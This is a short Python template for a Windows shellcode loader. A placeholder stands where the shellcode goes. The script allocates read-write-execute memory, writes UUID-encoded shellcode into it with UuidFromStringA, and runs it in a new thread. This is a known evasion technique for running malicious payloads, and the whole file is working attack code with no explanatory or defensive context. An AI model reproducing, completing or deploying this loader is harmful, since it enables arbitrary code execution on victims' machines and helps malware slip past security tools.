import ctypes

list = ${sh3llc0de_m}

rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(list)*16, 0x3000, 0x40)
rwxpage1 = rwxpage
for i in list:
    ctypes.windll.Rpcrt4.UuidFromStringA(i,rwxpage1)
    rwxpage1+=16
hanndle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(hanndle, -1)
